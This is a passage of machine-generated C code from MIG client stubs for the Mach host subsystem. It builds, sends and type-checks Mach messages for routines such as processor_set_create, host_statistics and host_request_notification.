		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->info.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->info.size / 4 != Out0P->infoCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_virtual_physical_table_info_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_virtual_physical_table_info */
mig_external kern_return_t host_virtual_physical_table_info
(
	host_t host,
	hash_info_bucket_array_t *info,
	mach_msg_type_number_t *infoCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t infoCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t infoCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_virtual_physical_table_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_virtual_physical_table_info_t__defined */

	__DeclareSendRpc(209, "host_virtual_physical_table_info")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 209;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(209, "host_virtual_physical_table_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(209, "host_virtual_physical_table_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_virtual_physical_table_info_t__defined)
	check_result = __MIG_check__Reply__host_virtual_physical_table_info_t((__Reply__host_virtual_physical_table_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_virtual_physical_table_info_t__defined) */

	*info = (hash_info_bucket_array_t)(Out0P->info.address);
	*infoCnt = Out0P->infoCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__processor_set_default_t__defined)
#define __MIG_check__Reply__processor_set_default_t__defined

mig_internal kern_return_t __MIG_check__Reply__processor_set_default_t(__Reply__processor_set_default_t *Out0P)
{

	typedef __Reply__processor_set_default_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 313) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->default_set.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->default_set.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__processor_set_default_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine processor_set_default */
mig_external kern_return_t processor_set_default
(
	host_t host,
	processor_set_name_t *default_set
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t default_set;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t default_set;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__processor_set_default_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__processor_set_default_t__defined */

	__DeclareSendRpc(213, "processor_set_default")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 213;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(213, "processor_set_default")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(213, "processor_set_default")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__processor_set_default_t__defined)
	check_result = __MIG_check__Reply__processor_set_default_t((__Reply__processor_set_default_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__processor_set_default_t__defined) */

	*default_set = Out0P->default_set.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__processor_set_create_t__defined)
#define __MIG_check__Reply__processor_set_create_t__defined

mig_internal kern_return_t __MIG_check__Reply__processor_set_create_t(__Reply__processor_set_create_t *Out0P)
{

	typedef __Reply__processor_set_create_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 314) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 2 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->new_set.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->new_set.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->new_name.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->new_name.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__processor_set_create_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine processor_set_create */
mig_external kern_return_t processor_set_create
(
	host_t host,
	processor_set_t *new_set,
	processor_set_name_t *new_name
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_set;
		mach_msg_port_descriptor_t new_name;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_set;
		mach_msg_port_descriptor_t new_name;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__processor_set_create_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__processor_set_create_t__defined */

	__DeclareSendRpc(214, "processor_set_create")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 214;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(214, "processor_set_create")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(214, "processor_set_create")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__processor_set_create_t__defined)
	check_result = __MIG_check__Reply__processor_set_create_t((__Reply__processor_set_create_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__processor_set_create_t__defined) */

	*new_set = Out0P->new_set.name;
	*new_name = Out0P->new_name.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__mach_memory_object_memory_entry_64_t__defined)
#define __MIG_check__Reply__mach_memory_object_memory_entry_64_t__defined

mig_internal kern_return_t __MIG_check__Reply__mach_memory_object_memory_entry_64_t(__Reply__mach_memory_object_memory_entry_64_t *Out0P)
{

	typedef __Reply__mach_memory_object_memory_entry_64_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 315) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->entry_handle.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->entry_handle.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__mach_memory_object_memory_entry_64_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine mach_memory_object_memory_entry_64 */
mig_external kern_return_t mach_memory_object_memory_entry_64
(
	host_t host,
	boolean_t internal,
	memory_object_size_t size,
	vm_prot_t permission,
	memory_object_t pager,
	mach_port_t *entry_handle
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t pager;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		boolean_t internal;
		memory_object_size_t size;
		vm_prot_t permission;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t entry_handle;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t entry_handle;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__mach_memory_object_memory_entry_64_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__mach_memory_object_memory_entry_64_t__defined */

	__DeclareSendRpc(215, "mach_memory_object_memory_entry_64")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t pagerTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->pager = pagerTemplate;
	InP->pager.name = pager;
#else	/* UseStaticTemplates */
	InP->pager.name = pager;
	InP->pager.disposition = 19;
	InP->pager.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->internal = internal;

	InP->size = size;

	InP->permission = permission;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 215;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(215, "mach_memory_object_memory_entry_64")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(215, "mach_memory_object_memory_entry_64")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__mach_memory_object_memory_entry_64_t__defined)
	check_result = __MIG_check__Reply__mach_memory_object_memory_entry_64_t((__Reply__mach_memory_object_memory_entry_64_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__mach_memory_object_memory_entry_64_t__defined) */

	*entry_handle = Out0P->entry_handle.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_statistics_t__defined)
#define __MIG_check__Reply__host_statistics_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_statistics_t(__Reply__host_statistics_t *Out0P)
{

	typedef __Reply__host_statistics_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 316) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 272)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->host_info_outCnt > 68 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 272)) / 4< Out0P->host_info_outCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 272) + Out0P->host_info_outCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_statistics_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_statistics */
mig_external kern_return_t host_statistics
(
	host_t host_priv,
	host_flavor_t flavor,
	host_info_t host_info_out,
	mach_msg_type_number_t *host_info_outCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		host_flavor_t flavor;
		mach_msg_type_number_t host_info_outCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t host_info_outCnt;
		integer_t host_info_out[68];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t host_info_outCnt;
		integer_t host_info_out[68];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_statistics_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_statistics_t__defined */

	__DeclareSendRpc(216, "host_statistics")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (*host_info_outCnt < 68)
		InP->host_info_outCnt = *host_info_outCnt;
	else
		InP->host_info_outCnt = 68;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host_priv;
	InP->Head.msgh_id = 216;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(216, "host_statistics")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(216, "host_statistics")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_statistics_t__defined)
	check_result = __MIG_check__Reply__host_statistics_t((__Reply__host_statistics_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_statistics_t__defined) */

	if (Out0P->host_info_outCnt > *host_info_outCnt) {
		(void)memcpy((char *) host_info_out, (const char *) Out0P->host_info_out, 4 *  *host_info_outCnt);
		*host_info_outCnt = Out0P->host_info_outCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) host_info_out, (const char *) Out0P->host_info_out, 4 * Out0P->host_info_outCnt);

	*host_info_outCnt = Out0P->host_info_outCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_request_notification_t__defined)
#define __MIG_check__Reply__host_request_notification_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_request_notification_t(__Reply__host_request_notification_t *Out0P)
{

	typedef __Reply__host_request_notification_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 317) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__host_request_notification_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_request_notification */
mig_external kern_return_t host_request_notification
(
	host_t host,
	host_flavor_t notify_type,
	mach_port_t notify_port
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notify_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		host_flavor_t notify_type;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_request_notification_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_request_notification_t__defined */

	__DeclareSendRpc(217, "host_request_notification")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t notify_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		21,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->notify_port = notify_portTemplate;
	InP->notify_port.name = notify_port;
#else	/* UseStaticTemplates */
	InP->notify_port.name = notify_port;
	InP->notify_port.disposition = 21;
	InP->notify_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->notify_type = notify_type;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
